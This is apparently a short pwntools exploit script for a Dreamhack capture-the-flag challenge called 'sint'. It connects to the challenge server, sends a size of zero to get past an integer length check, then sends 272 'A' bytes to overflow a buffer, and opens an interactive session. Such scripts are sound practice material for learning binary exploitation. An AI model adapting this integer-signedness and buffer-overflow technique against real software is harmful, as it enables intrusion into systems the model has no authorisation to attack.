from pwn import *

p = remote("host8.dreamhack.games",16395)
e = ELF("./sint")


context.log_level='debug'

p.sendlineafter(b'Size: ', b'0')
p.sendlineafter(b'Data: ', b'A' * (256+8+8))

p.interactive()